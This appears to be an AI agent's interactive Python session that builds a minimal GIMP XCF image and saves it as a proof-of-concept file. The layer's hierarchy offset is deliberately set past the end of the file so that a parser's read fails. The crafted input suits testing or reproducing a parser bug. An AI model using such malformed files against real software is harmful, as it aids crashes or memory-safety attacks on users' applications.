Running Python code interactively: import struct

# XCF file format (big-endian)
data = bytearray()

# Header: "gimp xcf " + version + null = 14 bytes
# Using "file" as the version (original XCF format)
header_tag = b"gimp xcf file\x00"
data.extend(header_tag)

# Image width, height, type (all big-endian uint32)
# type: 0=RGB, 1=GRAY, 2=INDEXED
img_width = 1
img_height = 1
img_type = 0  # RGB
data.extend(struct.pack('>III', img_width, img_height, img_type))

# Image properties
# PROP_COMPRESSION (type=17, size=1, value=0 for no compression)
data.extend(struct.pack('>II', 17, 1))  # prop type, size
data.extend(struct.pack('B', 0))  # compression = none

# PROP_END (type=0, size=0)
data.extend(struct.pack('>II', 0, 0))

# Layer offsets - we'll fill in the actual position later
layer_offset_pos = len(data)
data.extend(struct.pack('>I', 0))  # placeholder for layer offset
data.extend(struct.pack('>I', 0))  # zero terminator

# Layer data starts here
layer_data_pos = len(data)
# Fix up the layer offset
struct.pack_into('>I', data, layer_offset_pos, layer_data_pos)

# Layer: width, height, type, name
layer_width = 1
layer_height = 1
layer_type = 0  # RGB_GIMAGE
data.extend(struct.pack('>IIi', layer_width, layer_height, layer_type))

# Layer name (Pascal string: uint32 length + chars + null)
layer_name = b"layer\x00"
data.extend(struct.pack('>I', len(layer_name)))
data.extend(layer_name)

# Layer properties
# PROP_END (type=0, size=0)
data.extend(struct.pack('>II', 0, 0))

# hierarchy_offset and mask_offset
# Set hierarchy_offset to point way past end of file so the read fails
hierarchy_offset = 99999  # past end of buffer
mask_offset = 0
data.extend(struct.pack('>II', hierarchy_offset, mask_offset))

# Write the file
with open('/workspace/poc.xcf', 'wb') as f:
    f.write(data)

print(f"File size: {len(data)} bytes")
print(f"Layer offset: {layer_data_pos}")
print(f"Hierarchy offset: {hierarchy_offset}")
